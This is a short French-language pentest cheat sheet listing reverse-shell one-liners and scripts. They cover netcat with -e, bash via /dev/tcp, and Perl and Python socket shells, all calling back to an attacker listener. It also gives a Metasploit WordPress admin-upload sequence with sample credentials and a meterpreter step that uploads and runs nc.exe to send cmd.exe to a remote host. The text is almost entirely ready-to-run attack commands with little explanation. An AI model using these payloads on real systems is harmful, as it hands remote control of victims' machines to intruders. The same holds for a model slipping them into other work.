# Shell et reverse shell

**Reverse shell Netcat**

```bash
root@kali:~# nc -lnvp 12345
cible@debian:~$ nc 192.168.56.123 -e /bin/bash
```

**Reverse shell Bash**

```bash
root@kali:~# nc -lnvp 12345
cible@debian:~$ bash -i >& /dev/tcp/192.168.56.123/12345 0>&1
```

**Reverse shell Perl**

Script perl sur machine cible :

```perl
use Socket;
$i="192.168.56.123";
$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname ("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");
open(STDOUT,">&S"); open (STDERR, ">&S"); exec ("/bin/sh -i");};
```

Lancer un listener sur attaquant :

```bash
nc -lnvp 4444
```

**Reverse shell Python**

Script python sur machine cible :

```python
import socket,subprocess,os;
s=socket.socket (socket.AF_INET, socket.SOCK_STREAM);
s.connect (("192.168.56.123", 4444));
os.dup2 (s.fileno(),0);
os.dup2 (s.fileno(),1);
os.dup2 (s.fileno(), 2);
p=subprocess.call (["/bin/sh","-i"]);
```

Lancer un listener sur attaquant :

```bash
nc -lnvp 4444
```

Lancer script python sur cible :

```bash
python reverse.py
```
Lancer script perl sur cible :

```bash
perl reverse.perl
```

**Passer à un shell bash si shell pourri**

```bash
SHELL=/bin/bash script -q /dev/null
```

**Reverse-shell Wordpress**  

En cas d'accès à un wp-admin, possibilité de faire un reverse shell avec Metasploit :

```bash
msfconsole
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set PASSWORD P@s5w0rd!
msf > set USERNAME admin
msf > set TARGETURI /wordpress
msf > set RHOSTS 10.10.10.29
msf > run
```

Puis avoir un shell propre :

```
meterpreter> lcd /home/username/Downloads
meterpreter> cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
meterpreter > upload /usr/share/windows-binaries/nc.exe
```

En même temps, ouvrir un listener netcat dans un autre terminal : ```nc -lnvp 1234```.

```
meterpreter> execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"
```

Un shell est accessible depuis le listener Netcat.
